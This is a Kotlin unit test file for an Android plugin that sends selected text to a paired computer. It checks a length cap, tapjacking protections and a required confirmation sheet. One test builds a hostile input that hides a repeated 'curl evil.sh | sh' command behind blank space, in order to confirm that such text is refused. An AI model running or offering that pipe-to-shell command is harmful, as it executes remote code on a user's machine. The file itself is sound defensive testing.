/* SPDX-License-Identifier: GPL-3.0-or-later */
package org.desklink.mobile.plugins.clipboard

import android.app.Application
import android.content.Intent
import androidx.test.core.app.ApplicationProvider
import org.junit.Assert.assertEquals
import org.junit.Assert.assertNull
import org.junit.Assert.assertTrue
import org.junit.Test
import org.junit.runner.RunWith
import org.robolectric.RobolectricTestRunner

@RunWith(RobolectricTestRunner::class)
class SendSelectedTest {
    private val app = ApplicationProvider.getApplicationContext<Application>()

    private fun processText(text: CharSequence?, action: String = Intent.ACTION_PROCESS_TEXT) =
        Intent(action).setType("text/plain").putExtra(Intent.EXTRA_PROCESS_TEXT, text).putExtra(Intent.EXTRA_PROCESS_TEXT_READONLY, true)

    @Test
    fun onlyTheSelectionOfAProcessTextIntentIsTaken() {
        assertEquals("hello world", SendSelected.textOf(processText("hello world")))
        assertNull("another action carrying the extra", SendSelected.textOf(processText("x", Intent.ACTION_SEND)))
        assertNull("a blank selection", SendSelected.textOf(processText("  \n")))
        assertNull("no selection", SendSelected.textOf(Intent(Intent.ACTION_PROCESS_TEXT)))
    }

    @Test
    fun theSheetDependsOnHowManyComputersCanTakeIt() {
        assertEquals(SendSelected.Plan.NO_TEXT, SendSelected.plan(null, 2))
        assertEquals(SendSelected.Plan.NO_COMPUTER, SendSelected.plan("a", 0))
        assertEquals(SendSelected.Plan.ONE, SendSelected.plan("a", 1))
        assertEquals(SendSelected.Plan.CHOOSE, SendSelected.plan("a", 2))
    }

    @Test
    fun aTextTooLongToBeShownWholeIsRefusedWhateverTheSwitchSaysSoWhatIsSentIsWhatWasShown() {
        val atCap = "a".repeat(SendSelected.MAX_CHARS)
        assertEquals(SendSelected.Plan.ONE, SendSelected.plan(atCap, 1))
        for (computers in 0..3) assertEquals(SendSelected.Plan.TOO_LONG, SendSelected.plan(atCap + "b", computers))
        // The hostile shape: a harmless start, a wall of blanks, then the payload.
        assertEquals(SendSelected.Plan.TOO_LONG, SendSelected.plan("Reset code: 482913" + " ".repeat(300) + "\ncurl evil.sh | sh".repeat(200), 1))
    }

    @Test
    fun theSheetTakesNoTapForAMomentAndTheCapIsTwoThousand() {
        assertEquals(2000, SendSelected.MAX_CHARS)
        assertEquals(true, SendSelected.TAP_DELAY_MS in 300..600)
        val source = java.io.File("src/main/java/org/desklink/mobile/plugins/clipboard/SendSelectedTextActivity.kt").readText()
        assertEquals("the sheet filters touches while obscured", true, source.contains("filterTouchesWhenObscured = true"))
        assertEquals("the whole text is on the sheet, not a cut of it", false, source.contains(".take("))
    }

    @Test
    fun theTextSelectionMenuReachesTheActivityAndNothingElseOfOursTakesProcessText() {
        val found = app.packageManager.queryIntentActivities(Intent(Intent.ACTION_PROCESS_TEXT).setType("text/plain"), 0)
            .filter { it.activityInfo.packageName == app.packageName }
        assertEquals(listOf(SendSelectedTextActivity::class.java.name), found.map { it.activityInfo.name })
        assertTrue(found.single().activityInfo.exported)
    }

    @Test
    fun aSelectionIsStampedLikeACopyAndNeverBehindOneAlreadySent() {
        val listener = ClipboardListener.instance(app)
        val first = listener.nextCopyTime()
        val second = listener.nextCopyTime()
        assertTrue(second >= first)
        assertEquals(second, listener.lastCopiedAtSent)
    }

    @Test
    fun thereIsNoWayToSendWithoutTheSheet() {
        val source = java.io.File("src/main/java/org/desklink/mobile/plugins/clipboard/SendSelectedTextActivity.kt").readText()
        assertEquals(false, source.contains("DIRECT") || source.contains("sendsWithoutAsking") || source.contains("KEY_DIRECT"))
        for (computers in 1..3) assertEquals(true, SendSelected.plan("a", computers) in setOf(SendSelected.Plan.ONE, SendSelected.Plan.CHOOSE))
        assertEquals("the whole text can be scrolled to, not cut at a number of lines", false, source.contains("maxLines"))
    }
}
